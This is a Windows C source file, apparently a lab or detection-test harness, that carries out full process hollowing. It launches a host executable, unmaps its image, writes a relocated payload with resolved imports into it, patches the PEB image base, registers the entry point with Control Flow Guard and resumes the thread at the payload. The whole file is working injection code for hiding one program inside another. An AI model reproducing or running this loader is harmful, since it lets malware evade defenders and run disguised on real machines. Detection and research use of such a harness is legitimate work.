#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

typedef NTSTATUS (NTAPI *nt_query_information_process_fn)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
);
typedef NTSTATUS (NTAPI *nt_unmap_view_of_section_fn)(HANDLE, PVOID);
typedef BOOL (WINAPI *set_process_valid_call_targets_fn)(
    HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO
);

typedef struct image_buffer {
    BYTE *file;
    DWORD file_size;
    BYTE *mapped;
    SIZE_T mapped_size;
    ULONG_PTR preferred_base;
    DWORD entry_rva;
    IMAGE_NT_HEADERS *nt;
} image_buffer;

static BOOL range_valid(SIZE_T total, SIZE_T offset, SIZE_T length)
{
    return offset <= total && length <= total - offset;
}

static void release_image(image_buffer *image)
{
    if (image->mapped != NULL) HeapFree(GetProcessHeap(), 0, image->mapped);
    if (image->file != NULL) HeapFree(GetProcessHeap(), 0, image->file);
    ZeroMemory(image, sizeof(*image));
}

static BOOL read_payload(const wchar_t *path, image_buffer *image)
{
    HANDLE file = INVALID_HANDLE_VALUE;
    LARGE_INTEGER length;
    DWORD read_count = 0;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_SECTION_HEADER *section;
    WORD index;

    ZeroMemory(image, sizeof(*image));
    file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return FALSE;
    if (!GetFileSizeEx(file, &length) || length.QuadPart < 512
        || length.QuadPart > 64 * 1024 * 1024) {
        CloseHandle(file);
        return FALSE;
    }
    image->file_size = (DWORD)length.QuadPart;
    image->file = (BYTE *)HeapAlloc(GetProcessHeap(), 0, image->file_size);
    if (image->file == NULL) {
        CloseHandle(file);
        return FALSE;
    }
    if (!ReadFile(file, image->file, image->file_size, &read_count, NULL)
        || read_count != image->file_size) {
        CloseHandle(file);
        release_image(image);
        return FALSE;
    }
    CloseHandle(file);

    dos = (IMAGE_DOS_HEADER *)image->file;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE
        || dos->e_lfanew < (LONG)sizeof(*dos)
        || !range_valid(image->file_size, (SIZE_T)dos->e_lfanew, sizeof(*nt))) {
        release_image(image);
        return FALSE;
    }
    nt = (IMAGE_NT_HEADERS *)(image->file + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE
#ifdef _WIN64
        || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64
        || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC
#else
        || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386
        || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC
#endif
        || nt->FileHeader.NumberOfSections == 0
        || nt->FileHeader.NumberOfSections > 96
        || nt->OptionalHeader.SizeOfImage < 0x1000
        || nt->OptionalHeader.SizeOfImage > 64 * 1024 * 1024
        || nt->OptionalHeader.SizeOfHeaders > image->file_size
        || nt->OptionalHeader.AddressOfEntryPoint >= nt->OptionalHeader.SizeOfImage) {
        release_image(image);
        return FALSE;
    }
    section = IMAGE_FIRST_SECTION(nt);
    if (!range_valid(
            image->file_size,
            (SIZE_T)((BYTE *)section - image->file),
            (SIZE_T)nt->FileHeader.NumberOfSections * sizeof(*section))) {
        release_image(image);
        return FALSE;
    }
    image->mapped_size = nt->OptionalHeader.SizeOfImage;
    image->mapped = (BYTE *)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, image->mapped_size
    );
    if (image->mapped == NULL) {
        release_image(image);
        return FALSE;
    }
    CopyMemory(image->mapped, image->file, nt->OptionalHeader.SizeOfHeaders);
    for (index = 0; index < nt->FileHeader.NumberOfSections; ++index) {
        SIZE_T virtual_span = section[index].Misc.VirtualSize;
        if (virtual_span < section[index].SizeOfRawData) {
            virtual_span = section[index].SizeOfRawData;
        }
        if (!range_valid(image->mapped_size, section[index].VirtualAddress, virtual_span)
            || !range_valid(image->file_size, section[index].PointerToRawData,
                            section[index].SizeOfRawData)) {
            release_image(image);
            return FALSE;
        }
        if (section[index].SizeOfRawData != 0) {
            CopyMemory(
                image->mapped + section[index].VirtualAddress,
                image->file + section[index].PointerToRawData,
                section[index].SizeOfRawData
            );
        }
    }
    image->nt = (IMAGE_NT_HEADERS *)(image->mapped + dos->e_lfanew);
    image->preferred_base = (ULONG_PTR)image->nt->OptionalHeader.ImageBase;
    image->entry_rva = image->nt->OptionalHeader.AddressOfEntryPoint;
    return TRUE;
}

static DWORD protection_for_section(DWORD characteristics)
{
    BOOL execute = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL read = (characteristics & IMAGE_SCN_MEM_READ) != 0;
    BOOL write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
    if (execute) {
        if (write) return PAGE_EXECUTE_READWRITE;
        return read ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
    }
    if (write) return PAGE_READWRITE;
    return read ? PAGE_READONLY : PAGE_NOACCESS;
}

static HMODULE remote_module_base(DWORD pid, const wchar_t *module_name)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    MODULEENTRY32W entry;
    HMODULE result = NULL;
    if (snapshot == INVALID_HANDLE_VALUE) return NULL;
    ZeroMemory(&entry, sizeof(entry));
    entry.dwSize = sizeof(entry);
    if (Module32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szModule, module_name) == 0) {
                result = entry.hModule;
                break;
            }
        } while (Module32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return result;
}

static BOOL mapped_c_string(image_buffer *image, DWORD rva, const char **text)
{
    const char *candidate;
    SIZE_T remaining;
    if (rva >= image->mapped_size) return FALSE;
    candidate = (const char *)(image->mapped + rva);
    remaining = image->mapped_size - rva;
    if (memchr(candidate, '\0', remaining) == NULL) return FALSE;
    *text = candidate;
    return TRUE;
}

static BOOL resolve_remote_imports(
    image_buffer *image,
    DWORD pid,
    DWORD *resolved_count
)
{
    IMAGE_DATA_DIRECTORY directory =
        image->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR *descriptor;
    SIZE_T descriptor_cap;
    SIZE_T descriptor_index;
    *resolved_count = 0;
    if (directory.VirtualAddress == 0 || directory.Size == 0) return TRUE;
    if (!range_valid(image->mapped_size, directory.VirtualAddress, directory.Size)
        || directory.Size < sizeof(*descriptor)) {
        return FALSE;
    }
    descriptor = (IMAGE_IMPORT_DESCRIPTOR *)(image->mapped + directory.VirtualAddress);
    descriptor_cap = directory.Size / sizeof(*descriptor);
    for (descriptor_index = 0; descriptor_index < descriptor_cap; ++descriptor_index) {
        const char *module_name;
        HMODULE local_module;
        IMAGE_THUNK_DATA *lookup;
        IMAGE_THUNK_DATA *iat;
        SIZE_T thunk_cap;
        SIZE_T thunk_index;
        if (descriptor[descriptor_index].Name == 0
            && descriptor[descriptor_index].FirstThunk == 0) {
            return TRUE;
        }
        if (!mapped_c_string(image, descriptor[descriptor_index].Name, &module_name)) {
            return FALSE;
        }
        local_module = LoadLibraryA(module_name);
        if (local_module == NULL) return FALSE;
        if (descriptor[descriptor_index].FirstThunk >= image->mapped_size) return FALSE;
        iat = (IMAGE_THUNK_DATA *)(
            image->mapped + descriptor[descriptor_index].FirstThunk
        );
        if (descriptor[descriptor_index].OriginalFirstThunk != 0) {
            if (descriptor[descriptor_index].OriginalFirstThunk >= image->mapped_size) {
                return FALSE;
            }
            lookup = (IMAGE_THUNK_DATA *)(
                image->mapped + descriptor[descriptor_index].OriginalFirstThunk
            );
        } else {
            lookup = iat;
        }
        thunk_cap = (image->mapped_size - descriptor[descriptor_index].FirstThunk)
                    / sizeof(*iat);
        for (thunk_index = 0; thunk_index < thunk_cap; ++thunk_index) {
            FARPROC procedure;
            MEMORY_BASIC_INFORMATION memory;
            HMODULE local_owner;
            WCHAR owner_path[MAX_PATH];
            wchar_t *owner_name;
            HMODULE remote_owner;
            ULONG_PTR remote_procedure;
            if (lookup[thunk_index].u1.AddressOfData == 0) break;
            if (IMAGE_SNAP_BY_ORDINAL(lookup[thunk_index].u1.Ordinal)) {
                procedure = GetProcAddress(
                    local_module,
                    (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL(lookup[thunk_index].u1.Ordinal)
                );
            } else {
                DWORD name_rva = (DWORD)lookup[thunk_index].u1.AddressOfData;
                IMAGE_IMPORT_BY_NAME *import_name;
                if (!range_valid(image->mapped_size, name_rva,
                                 sizeof(IMAGE_IMPORT_BY_NAME))) {
                    return FALSE;
                }
                import_name = (IMAGE_IMPORT_BY_NAME *)(image->mapped + name_rva);
                if (memchr(import_name->Name, '\0', image->mapped_size
                           - name_rva - FIELD_OFFSET(IMAGE_IMPORT_BY_NAME, Name)) == NULL) {
                    return FALSE;
                }
                procedure = GetProcAddress(local_module, (LPCSTR)import_name->Name);
            }
            if (procedure == NULL
                || VirtualQuery((LPCVOID)(ULONG_PTR)procedure, &memory, sizeof(memory)) == 0) {
                return FALSE;
            }
            local_owner = (HMODULE)memory.AllocationBase;
            if (GetModuleFileNameW(local_owner, owner_path, MAX_PATH) == 0) return FALSE;
            owner_name = wcsrchr(owner_path, L'\\');
            owner_name = owner_name != NULL ? owner_name + 1 : owner_path;
            remote_owner = remote_module_base(pid, owner_name);
            if (remote_owner == NULL) return FALSE;
            remote_procedure = (ULONG_PTR)remote_owner
                + ((ULONG_PTR)procedure - (ULONG_PTR)local_owner);
            iat[thunk_index].u1.Function = remote_procedure;
            ++*resolved_count;
        }
        if (thunk_index == thunk_cap) return FALSE;
    }
    return FALSE;
}

static BOOL relocate_mapped_image(image_buffer *image, ULONG_PTR actual_base)
{
    IMAGE_DATA_DIRECTORY directory =
        image->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ULONG_PTR delta = actual_base - image->preferred_base;
    SIZE_T consumed = 0;
    if (delta == 0) return TRUE;
    if (directory.VirtualAddress == 0 || directory.Size < sizeof(IMAGE_BASE_RELOCATION)
        || !range_valid(image->mapped_size, directory.VirtualAddress, directory.Size)) {
        return FALSE;
    }
    while (consumed + sizeof(IMAGE_BASE_RELOCATION) <= directory.Size) {
        IMAGE_BASE_RELOCATION *block = (IMAGE_BASE_RELOCATION *)(
            image->mapped + directory.VirtualAddress + consumed
        );
        WORD *entries;
        DWORD entry_count;
        DWORD index;
        if (block->SizeOfBlock < sizeof(*block)
            || block->SizeOfBlock > directory.Size - consumed) {
            return FALSE;
        }
        entries = (WORD *)(block + 1);
        entry_count = (block->SizeOfBlock - sizeof(*block)) / sizeof(WORD);
        for (index = 0; index < entry_count; ++index) {
            WORD type = entries[index] >> 12;
            DWORD rva = block->VirtualAddress + (entries[index] & 0x0FFFu);
            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
#ifdef _WIN64
            if (type != IMAGE_REL_BASED_DIR64
                || !range_valid(image->mapped_size, rva, sizeof(ULONGLONG))) {
                return FALSE;
            }
            *(ULONGLONG *)(image->mapped + rva) += (ULONGLONG)delta;
#else
            if (type != IMAGE_REL_BASED_HIGHLOW
                || !range_valid(image->mapped_size, rva, sizeof(DWORD))) {
                return FALSE;
            }
            *(DWORD *)(image->mapped + rva) += (DWORD)delta;
#endif
        }
        consumed += block->SizeOfBlock;
    }
    return consumed == directory.Size;
}

static BOOL protect_remote_image(HANDLE process, BYTE *remote, image_buffer *image)
{
    IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(image->nt);
    WORD index;
    DWORD old_protection = 0;
    if (!VirtualProtectEx(process, remote, image->nt->OptionalHeader.SizeOfHeaders,
                          PAGE_READONLY, &old_protection)) {
        return FALSE;
    }
    for (index = 0; index < image->nt->FileHeader.NumberOfSections; ++index) {
        SIZE_T size = section[index].Misc.VirtualSize;
        if (size == 0) size = section[index].SizeOfRawData;
        if (size != 0 && !VirtualProtectEx(
                process, remote + section[index].VirtualAddress, size,
                protection_for_section(section[index].Characteristics),
                &old_protection)) {
            return FALSE;
        }
    }
    return FlushInstructionCache(process, remote, image->mapped_size);
}

static BOOL register_remote_entry_cfg(
    HANDLE process,
    BYTE *remote,
    image_buffer *image
)
{
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    set_process_valid_call_targets_fn set_targets;
    IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(image->nt);
    WORD index;
    SYSTEM_INFO system_info;
    SIZE_T page_size;
    ULONG_PTR entry_address = (ULONG_PTR)(remote + image->entry_rva);
    ULONG_PTR region_address;
    SIZE_T region_size;
    CFG_CALL_TARGET_INFO target;
    set_targets = (set_process_valid_call_targets_fn)(ULONG_PTR)GetProcAddress(
        kernel32, "SetProcessValidCallTargets"
    );
    if (set_targets == NULL) return TRUE;
    GetSystemInfo(&system_info);
    page_size = system_info.dwPageSize;
    for (index = 0; index < image->nt->FileHeader.NumberOfSections; ++index) {
        SIZE_T span = section[index].Misc.VirtualSize;
        ULONG_PTR section_start = (ULONG_PTR)(remote + section[index].VirtualAddress);
        ULONG_PTR section_end;
        if (span < section[index].SizeOfRawData) span = section[index].SizeOfRawData;
        section_end = section_start + span;
        if ((section[index].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0
            || entry_address < section_start || entry_address >= section_end) {
            continue;
        }
        region_address = section_start & ~((ULONG_PTR)page_size - 1u);
        region_size = (SIZE_T)(
            ((section_end + page_size - 1u) & ~((ULONG_PTR)page_size - 1u))
            - region_address
        );
        ZeroMemory(&target, sizeof(target));
        target.Offset = entry_address - region_address;
        target.Flags = CFG_CALL_TARGET_VALID;
        return set_targets(
            process, (PVOID)region_address, region_size, 1, &target
        );
    }
    SetLastError(ERROR_INVALID_ADDRESS);
    return FALSE;
}

static int fail_with_cleanup(
    const char *stage,
    DWORD code,
    PROCESS_INFORMATION *process,
    image_buffer *image
)
{
    fprintf(stderr, "HOLLOW_FAIL stage=%s error=%lu\n", stage, code);
    if (process->hProcess != NULL) {
        (void)TerminateProcess(process->hProcess, 90);
    }
    if (process->hThread != NULL) CloseHandle(process->hThread);
    if (process->hProcess != NULL) CloseHandle(process->hProcess);
    release_image(image);
    return 90;
}

int wmain(int argc, wchar_t **argv)
{
    const wchar_t *host_path = argc > 1 ? argv[1] : L"hollow_host.exe";
    const wchar_t *payload_path = argc > 2 ? argv[2] : L"hollow_payload.exe";
    DWORD pre_resume_ms = argc > 3 ? (DWORD)_wcstoui64(argv[3], NULL, 0) : 0;
    image_buffer image;
    STARTUPINFOW startup;
    PROCESS_INFORMATION process;
    PROCESS_BASIC_INFORMATION basic;
    CONTEXT context;
    WCHAR command_line[32768];
    SECURITY_ATTRIBUTES event_security;
    HMODULE ntdll;
    nt_query_information_process_fn query_process;
    nt_unmap_view_of_section_fn unmap_view;
    ULONG return_length = 0;
    PVOID host_base = NULL;
    BYTE *remote = NULL;
    HANDLE ready_event = NULL;
    SIZE_T written = 0;
    ULONG_PTR remote_base_value;
    DWORD resolved_imports = 0;
    DWORD wait_result;
    DWORD exit_code = 0;
    SIZE_T peb_image_base_offset = sizeof(void *) == 8 ? 0x10u : 0x08u;

    ZeroMemory(&image, sizeof(image));
    ZeroMemory(&startup, sizeof(startup));
    ZeroMemory(&process, sizeof(process));
    startup.cb = sizeof(startup);
    startup.dwFlags = STARTF_USESTDHANDLES;
    startup.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    startup.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    startup.hStdError = GetStdHandle(STD_ERROR_HANDLE);
    ZeroMemory(&event_security, sizeof(event_security));
    event_security.nLength = sizeof(event_security);
    event_security.bInheritHandle = TRUE;

    if (!read_payload(payload_path, &image)) {
        return fail_with_cleanup("read-payload", GetLastError(), &process, &image);
    }
    ready_event = CreateEventW(&event_security, TRUE, FALSE, NULL);
    if (ready_event == NULL) {
        return fail_with_cleanup("create-ready-event", GetLastError(), &process, &image);
    }
    if (swprintf_s(
            command_line, sizeof(command_line) / sizeof(command_line[0]),
            L"\"%ls\" --ready-handle 0x%llX", host_path,
            (unsigned long long)(ULONG_PTR)ready_event
        ) < 0) {
        return fail_with_cleanup("command-line", ERROR_INSUFFICIENT_BUFFER, &process, &image);
    }
    if (!CreateProcessW(host_path, command_line, NULL, NULL, TRUE, 0,
                        NULL, NULL, &startup, &process)) {
        return fail_with_cleanup("create-suspended", GetLastError(), &process, &image);
    }
    if (WaitForSingleObject(ready_event, 5000) != WAIT_OBJECT_0) {
        return fail_with_cleanup("wait-host-loader", GetLastError(), &process, &image);
    }
    if (SuspendThread(process.hThread) == (DWORD)-1) {
        return fail_with_cleanup("suspend-host", GetLastError(), &process, &image);
    }

    ntdll = GetModuleHandleW(L"ntdll.dll");
    query_process = (nt_query_information_process_fn)(ULONG_PTR)GetProcAddress(
        ntdll, "NtQueryInformationProcess"
    );
    unmap_view = (nt_unmap_view_of_section_fn)(ULONG_PTR)GetProcAddress(
        ntdll, "NtUnmapViewOfSection"
    );
    if (query_process == NULL || unmap_view == NULL) {
        return fail_with_cleanup("resolve-ntdll", ERROR_PROC_NOT_FOUND, &process, &image);
    }
    ZeroMemory(&basic, sizeof(basic));
    if (query_process(process.hProcess, ProcessBasicInformation, &basic,
                      sizeof(basic), &return_length) < 0) {
        return fail_with_cleanup("query-peb", GetLastError(), &process, &image);
    }
    if (!ReadProcessMemory(
            process.hProcess,
            (BYTE *)basic.PebBaseAddress + peb_image_base_offset,
            &host_base, sizeof(host_base), &written
        ) || written != sizeof(host_base)) {
        return fail_with_cleanup("read-host-base", GetLastError(), &process, &image);
    }
    if (unmap_view(process.hProcess, host_base) < 0) {
        return fail_with_cleanup("unmap-host", GetLastError(), &process, &image);
    }
    remote = (BYTE *)VirtualAllocEx(
        process.hProcess, (PVOID)image.preferred_base, image.mapped_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
    );
    if (remote == NULL) {
        remote = (BYTE *)VirtualAllocEx(
            process.hProcess, host_base, image.mapped_size,
            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
        );
    }
    if (remote == NULL) {
        return fail_with_cleanup("allocate-payload-base", GetLastError(), &process, &image);
    }
    if (!relocate_mapped_image(&image, (ULONG_PTR)remote)) {
        return fail_with_cleanup("relocate-payload", ERROR_BAD_EXE_FORMAT, &process, &image);
    }
    if (!resolve_remote_imports(&image, process.dwProcessId, &resolved_imports)) {
        return fail_with_cleanup("resolve-payload-imports", GetLastError(), &process, &image);
    }
    if (!WriteProcessMemory(process.hProcess, remote, image.mapped,
                            image.mapped_size, &written)
        || written != image.mapped_size) {
        return fail_with_cleanup("write-payload", GetLastError(), &process, &image);
    }
    remote_base_value = (ULONG_PTR)remote;
    if (!WriteProcessMemory(
            process.hProcess,
            (BYTE *)basic.PebBaseAddress + peb_image_base_offset,
            &remote_base_value, sizeof(remote_base_value), &written
        ) || written != sizeof(remote_base_value)) {
        return fail_with_cleanup("write-peb-base", GetLastError(), &process, &image);
    }
    if (!protect_remote_image(process.hProcess, remote, &image)) {
        return fail_with_cleanup("protect-payload", GetLastError(), &process, &image);
    }
    if (!register_remote_entry_cfg(process.hProcess, remote, &image)) {
        return fail_with_cleanup("register-payload-cfg", GetLastError(), &process, &image);
    }
    printf(
        "HOLLOW_EVENT parentPid=%lu childPid=%lu host=hollow_host.exe "
        "payload=hollow_payload.exe remoteBase=0x%llX entryRva=0x%lX "
        "imports=%lu\n",
        GetCurrentProcessId(), process.dwProcessId,
        (unsigned long long)(ULONG_PTR)remote, image.entry_rva, resolved_imports
    );
    fflush(stdout);
    if (pre_resume_ms > 30000) pre_resume_ms = 30000;
    if (pre_resume_ms != 0) Sleep(pre_resume_ms);
    ZeroMemory(&context, sizeof(context));
    context.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(process.hThread, &context)) {
        return fail_with_cleanup("get-host-context", GetLastError(), &process, &image);
    }
#ifdef _WIN64
    context.Rip = (DWORD64)(ULONG_PTR)(remote + image.entry_rva);
#else
    context.Eip = (DWORD)(ULONG_PTR)(remote + image.entry_rva);
#endif
    if (!SetThreadContext(process.hThread, &context)) {
        return fail_with_cleanup("set-payload-context", GetLastError(), &process, &image);
    }
    if (ResumeThread(process.hThread) == (DWORD)-1) {
        return fail_with_cleanup("resume-payload-context", GetLastError(), &process, &image);
    }
    wait_result = WaitForSingleObject(process.hProcess, 35000);
    if (wait_result != WAIT_OBJECT_0
        || !GetExitCodeProcess(process.hProcess, &exit_code)) {
        return fail_with_cleanup("wait-payload", GetLastError(), &process, &image);
    }
    printf("HOLLOW_PARENT_OK childPid=%lu childExit=%lu observed=1\n",
           process.dwProcessId, exit_code);
    CloseHandle(ready_event);
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
    release_image(&image);
    return exit_code == 42 ? 0 : 91;
}
